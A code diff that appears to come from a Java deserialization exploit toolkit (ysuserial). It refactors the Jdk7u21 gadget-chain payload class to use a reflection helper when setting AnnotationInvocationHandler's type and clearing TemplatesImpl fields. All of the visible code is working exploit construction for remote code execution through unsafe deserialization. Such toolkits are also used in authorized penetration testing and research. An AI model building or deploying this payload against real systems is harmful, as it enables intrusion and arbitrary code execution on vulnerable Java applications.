@@ -14,6 +14,7 @@ import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
 import org.su18.ysuserial.payloads.util.JavaVersion;
+import org.su18.ysuserial.payloads.util.Reflections;
 
 
 /*
@@ -75,9 +76,7 @@ public class Jdk7u21 implements ObjectPayload<Object> {
 		InvocationHandler tempHandler = (InvocationHandler) constructor.newInstance(Override.class, map);
 
 		// 反射写入 AnnotationInvocationHandler 的 type
-		Field field = c.getDeclaredField("type");
-		field.setAccessible(true);
-		field.set(tempHandler, Templates.class);
+		Reflections.setFieldValue(tempHandler, "type", Templates.class);
 
 		// 为 Templates 创建动态代理
 		Templates proxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
@@ -89,13 +88,8 @@ public class Jdk7u21 implements ObjectPayload<Object> {
 		set.add(proxy);
 
 		// 反射将 _auxClasses 和 _class 修改为 null
-		Field field2 = TemplatesImpl.class.getDeclaredField("_auxClasses");
-		field2.setAccessible(true);
-		field2.set(templates, null);
-
-		Field field3 = TemplatesImpl.class.getDeclaredField("_class");
-		field3.setAccessible(true);
-		field3.set(templates, null);
+		Reflections.setFieldValue(templates, "_auxClasses", null);
+		Reflections.setFieldValue(templates, "_class", null);
 
 		// 向 map 中替换 tmpl 对象
 		map.put(zeroHashCodeStr, templates);
